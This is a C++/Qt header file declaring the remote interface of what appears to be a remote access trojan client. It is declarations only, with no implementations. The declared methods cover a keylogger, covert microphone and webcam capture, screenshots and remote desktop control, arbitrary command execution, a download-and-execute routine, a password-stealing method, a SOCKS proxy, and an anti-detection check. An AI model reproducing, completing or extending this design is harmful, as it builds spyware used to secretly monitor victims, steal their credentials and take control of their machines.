#ifndef ABSTRACTCLIENT_H
#define ABSTRACTCLIENT_H

#include <Peer>
#include <QString>
#include <QImage>

class AbstractClient : public Neuron::Peer
{
    Q_OBJECT
    Q_PROPERTY(QString address READ address)

public:
    QString address() const;

    enum Platform{
        Windows,
        Linux,
        MacOS,
        Android
    };
    Q_ENUM(Platform)

    N_CLASS_DECL(AbstractClient)


    N_PROPERTY_DECL(QString, os, os, setOs, osChanged)
    N_PROPERTY_DECL(QString, version, version, setVersion, versionChanged)
    N_PROPERTY_DECL(int, platform, platform, setPlatform, platformChanged)

    N_REMOTE_METHOD_DECL(ping)
    N_REMOTE_METHOD_DECL(QVariant, info)

    N_REMOTE_METHOD_DECL(messageBox, QString, title, QString, text, int, icons)
    N_REMOTE_METHOD_DECL(QVariant, tasks)
    N_REMOTE_METHOD_DECL(int, killProcess, int, pid)

    N_REMOTE_METHOD_DECL(QVariant, startupItems)


    N_REMOTE_METHOD_DECL(test, int, n)

    N_REMOTE_METHOD_DECL(shutdown)
    N_REMOTE_METHOD_DECL(reboot)
    N_REMOTE_METHOD_DECL(logout)

    N_REMOTE_METHOD_DECL(QImage, webcamImage)
    N_REMOTE_METHOD_DECL(QImage, screenshot)
    N_REMOTE_METHOD_DECL(QVariant, execute, QString, command, QString, dir)

    //files

    N_REMOTE_METHOD_DECL(QVariant, dirEntries, QString, path)

    N_REMOTE_METHOD_DECL(visitWebsite, QString, url, int, mode)

    //webcam
    N_REMOTE_METHOD_DECL(QStringList, cameras)
    N_REMOTE_METHOD_DECL(bool, startCamera, QByteArray, deviceName)
    N_REMOTE_METHOD_DECL(stopCamera)
    N_REMOTE_METHOD_DECL(QImage, cameraFrame)

    N_REMOTE_METHOD_DECL(QVariant, systemInformations)

    //vnc
    N_REMOTE_METHOD_DECL(bool, startVnc)
    N_REMOTE_METHOD_DECL(bool, startRemoteDesktop, int, width, int, heigth, int, colors, int, port)
    N_REMOTE_METHOD_DECL(endRemoteDesktop)

    N_REMOTE_METHOD_DECL(void, mouseClick, QPoint, pt, int, key)
    N_REMOTE_METHOD_DECL(void, mousePress, QPoint, pt, int, key)
    N_REMOTE_METHOD_DECL(void, mouseRelease, QPoint, pt, int, key)
    N_REMOTE_METHOD_DECL(void, mouseMove, QPoint, pt, int, key)

    N_REMOTE_METHOD_DECL(keyPress, int, key, int, modif)

    N_REMOTE_METHOD_DECL(lockDesktop)
    N_REMOTE_METHOD_DECL(unlockDesktop)

    //keylogger
    N_REMOTE_METHOD_DECL(bool, startKeylogger)
    N_REMOTE_METHOD_DECL(bool, queryKeylogger)
    N_REMOTE_METHOD_DECL(bool, stopKeylogger)
    N_REMOTE_METHOD_DECL(QString, keyloggerFile)

    //socks
    N_REMOTE_METHOD_DECL(bool, startSocksProxy, int, port, qreal, throttle)
    N_REMOTE_METHOD_DECL(QVariant, querySocksProxy)
    N_REMOTE_METHOD_DECL(bool, requestNewConnection)
    N_REMOTE_METHOD_DECL(bool, endSocksProxy)

    //mic spy
    N_REMOTE_METHOD_DECL(QStringList, micList)
    N_REMOTE_METHOD_DECL(bool, startMicSpy, QString, deviceName, int, port)
    N_REMOTE_METHOD_DECL(bool, queryMicSpy)
    N_REMOTE_METHOD_DECL(bool, stopMicSpy)

    //spy
    N_REMOTE_METHOD_DECL(QVariantList, passwords)

    N_REMOTE_METHOD_DECL(void, downloadAndExec, QString, url)

    //anti
    N_REMOTE_METHOD_DECL(QVariant, detector)

    N_REMOTE_METHOD_DECL(QVariant, grabUrls)
};

Q_DECLARE_METATYPE(AbstractClient*)

#endif // ABSTRACTCLIENT_H
